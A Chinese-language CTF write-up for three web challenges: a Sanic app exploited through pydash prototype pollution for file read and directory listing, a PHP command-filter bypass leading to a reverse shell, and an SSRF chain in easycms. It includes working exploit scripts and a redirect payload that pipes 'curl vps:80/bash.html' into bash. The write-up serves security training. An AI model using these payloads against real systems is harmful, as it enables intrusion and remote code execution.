## sanic
/src
```python
from sanic import Sanic
from sanic.response import text, html
from sanic_session import Session
import pydash
# pydash==5.1.2


class Pollute:
    def __init__(self):
        pass


app = Sanic(__name__)
app.static("/static/", "./static/")
Session(app)


@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())


@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user.lower() == 'adm;n':
        request.ctx.session['admin'] = True
        return text("login success")

    return text("login fail")


@app.route("/src")
async def src(request):
    return text(open(__file__).read())


@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")

    return text("forbidden")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

`adm;n` 八进制bypass

```
user="adm\073n"
```

pydash原型链污染
`_.`转义bypass

```
__init__\\\\.__globals__
```

任意文件读取通过 set_() 通过原型链污染可以对原本的值进行修改
```
{"key":"__init__\\\\.__globals__\\\\.__file__","value":"/etc/passwd"}
```


![](attachments/Pasted%20image%2020240611143058.png)

访问src读取源码

![](attachments/Pasted%20image%2020240611143134.png)

后续就是框架的利用,直接丢别的师傅的exp，基本上和框架中DirectoryHandler这个类相关

```PYTHON
import requests
#开启列目录
data = {"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": True}

#将目录设置在根目录下
data = {"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts","value": ["/"]}

#读取flag文件
data = {"key":"__init__\\\\.__globals__\\\\.__file__","value": "/flag文件名字"}

cookie={"session":"your_session"}

response = requests.post(url='http://127.0.0.1:8000/admin', json=data,cookies=cookie)

print(response.text)
```

## simple_php

```php
<?php  
ini_set('open_basedir', '/var/www/html/');  
error_reporting(0);  
  
if(isset($_POST['cmd'])){
	$cmd = escapeshellcmd($_POST['cmd']);
	if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {         
     system($cmd);  
}  
}  
  
  
show_source(__FILE__);  
?>
```

![](attachments/Pasted%20image%2020240611162935.png)
`\` 完成shell命令的分割实现bypass

`eval`  和 `echo` 结合搭配`base64`实现反弹shell
### 解2
diff没ban 可以直接diff读文件

flag在mysql中，mysqldump 直接拿flag
## easycms

```PHP
if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
   echo "Just input 'cmd' From 127.0.0.1";
   return;
}else{
   system($_GET['cmd']);
}
```

GITHUB

![](attachments/Pasted%20image%2020240614134108.png)

应该是打ssrf，准备源码代码审计

找curl类似的函数

![](attachments/Pasted%20image%2020240614140904.png)

Helper.php 的主要关键代码

```PHP
function dr_catcher_data($url, $timeout = 0) {  
  
    // 获取本地文件  
    if (strpos($url, 'file://')  === 0) {  
        return file_get_contents($url);  
    }  
  
    // curl模式  
    if (function_exists('curl_init')) {  
        $ch = curl_init($url);  
        if (substr($url, 0, 8) == "https://") {  
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查  
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, true); // 从证书中检查SSL加密算法是否存在  
        }  
        curl_setopt($ch, CURLOPT_HEADER, 0);  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        // 最大执行时间  
        $timeout && curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);  
        $data = curl_exec($ch);  
        $code = curl_getinfo($ch,CURLINFO_HTTP_CODE);  
        $errno = curl_errno($ch);  
        if (CI_DEBUG && $errno) {  
            log_message('error', '获取远程数据失败['.$url.']：（'.$errno.'）'.curl_error($ch));  
        }  
        curl_close($ch);  
        if ($code == 200) {  
            return $data;  
        } elseif ($errno == 35) {  
            // 当服务器不支持时改为普通获取方式  
        } else {  
            return '';  
        }  
    }  
  
    //设置超时参数  
    if ($timeout && function_exists('stream_context_create')) {  
        // 解析协议  
        $opt = [  
            'http' => [  
                'method'  => 'GET',  
                'timeout' => $timeout,  
            ],  
            'https' => [  
                'method'  => 'GET',  
                'timeout' => $timeout,  
            ]  
        ];  
        $ptl = substr($url, 0, 8) == "https://" ? 'https' : 'http';  
        $data = file_get_contents($url, 0, stream_context_create([  
            $ptl => $opt[$ptl]  
        ]));  
    } else {  
        $data = file_get_contents($url);  
    }  
  
    return $data;  
}
```

`dr_catcher_data`在api.php中主要用于测试网络

![](attachments/Pasted%20image%2020240614141940.png)

```PHP
public function qrcode() {  
  
    $value = urldecode(\Phpcmf\Service::L('input')->get('text'));  
    $thumb = urldecode(\Phpcmf\Service::L('input')->get('thumb'));  
    $matrixPointSize = (int)\Phpcmf\Service::L('input')->get('size');  
    $errorCorrectionLevel = dr_safe_replace(\Phpcmf\Service::L('input')->get('level'));  
  
    //生成二维码图片  
    require_once CMSPATH.'Library/Phpqrcode.php';  
    $file = WRITEPATH.'file/qrcode-'.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).'-qrcode.png';  
    if (is_file($file)) {  
        $QR = imagecreatefrompng($file);  
    } else {  
        \QRcode::png($value, $file, $errorCorrectionLevel, $matrixPointSize, 3);  
        $QR = imagecreatefromstring(file_get_contents($file));  
        if ($thumb) {  
            $logo = imagecreatefromstring(dr_catcher_data($thumb));  
            $QR_width = imagesx($QR);//二维码图片宽度  
            $QR_height = imagesy($QR);//二维码图片高度  
            $logo_width = imagesx($logo);//logo图片宽度  
            $logo_height = imagesy($logo);//logo图片高度  
            $logo_qr_width = $QR_width / 4;  
            $scale = $logo_width/$logo_qr_width;  
            $logo_qr_height = $logo_height/$scale;  
            $from_width = ($QR_width - $logo_qr_width) / 2;  
            //重新组合图片并调整大小  
            imagecopyresampled($QR, $logo, $from_width, $from_width, 0, 0, $logo_qr_width, $logo_qr_height, $logo_width, $logo_height);  
            imagepng($QR, $file);  
        }  
    }  
  
    // 输出图片  
    ob_start();  
    ob_clean();  
    header("Content-type: image/png");  
    ImagePng($QR);  
    exit;  
}
```

参数获取thumb，用thumb来实现访问vps，再在vps上做一个302跳转到flag.php

flask 302
```python
from flask import Flask, redirect
​
app = Flask(__name__)
​
@app.route('/')
def index():
    return redirect("http://127.0.0.1/flag.php?cmd=curl vps:80/bash.html|bash")
​
​
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=21000)
```

php 302

```php
<?php
    //header("HTTP/1.1 302 found"); 
    //header("Location:http://127.0.0.1:1337/flag");
    //header("Location:file:///etc/passwd");
    header("Location:http://127.0.0.1/flag.php?cmd=xxxxxx");
    exit();
?>
```